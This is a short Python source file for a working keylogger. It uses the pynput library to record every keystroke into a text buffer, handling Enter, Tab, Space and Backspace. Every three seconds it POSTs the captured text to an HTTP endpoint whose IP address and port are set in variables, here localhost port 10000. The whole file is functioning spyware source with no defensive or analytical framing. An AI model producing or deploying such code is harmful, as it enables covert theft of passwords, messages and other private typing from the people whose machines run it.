from pynput import keyboard
import requests
import threading

ip_address = "127.0.0.1"
port_number = "10000"
text = "test"

def send_post_req():
    try:
        payload = "Keylogger data" + text
        requests.post(f"http://{ip_address}:{port_number}/api/v1/keys", data=payload)
        timer = threading.Timer(3, send_post_req)
        timer.start()
    except:
        print("Request couldn't be fulfilled")

def on_release(key):
    global text
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        text += str(key).strip("'")

with keyboard.Listener(
    on_press=on_release) as listener:
    print("="*15)
    print(text)
    print("="*15)
    send_post_req()
    listener.join()
